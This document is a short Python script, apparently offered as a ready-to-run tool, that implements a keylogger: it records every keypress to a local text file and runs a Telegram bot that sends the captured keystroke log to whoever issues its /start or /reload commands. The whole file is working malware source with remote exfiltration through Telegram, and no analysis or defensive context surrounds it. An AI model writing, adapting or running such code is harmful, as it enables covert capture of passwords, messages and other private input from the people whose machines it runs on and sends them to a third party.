import keyboard
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import threading

class KeyLogger:
    def __init__(self):
        self.running = True

    def start(self):
        keyboard.on_press(self.handle_key)
        keyboard.wait()

    def handle_key(self, event):
        key = getattr(event, "name", str(event))

        with open("test.txt", "a", encoding="utf-8") as f:
            f.write(f"{key}\n")

def telegram_bot():
    file = "test.txt"
  
    #TOKEN = "Your_Telegram_Token"
    
    with open("bot_token.txt", "r") as f:
        TOKEN = f.read().strip()

    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Starting... \n/reload -> reload")
        await context.bot.send_document(chat_id=update.effective_chat.id, document=open(file, 'rb'))

    def main() -> None:
        application = Application.builder().token(f"{TOKEN}").build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("reload", start))

        application.run_polling()

    main()

if __name__ == "__main__":
    with open('test.txt', 'w') as fp:
        pass
      
    k = KeyLogger()

    t = threading.Thread(target=k.start)
    t.start()

    telegram_bot()
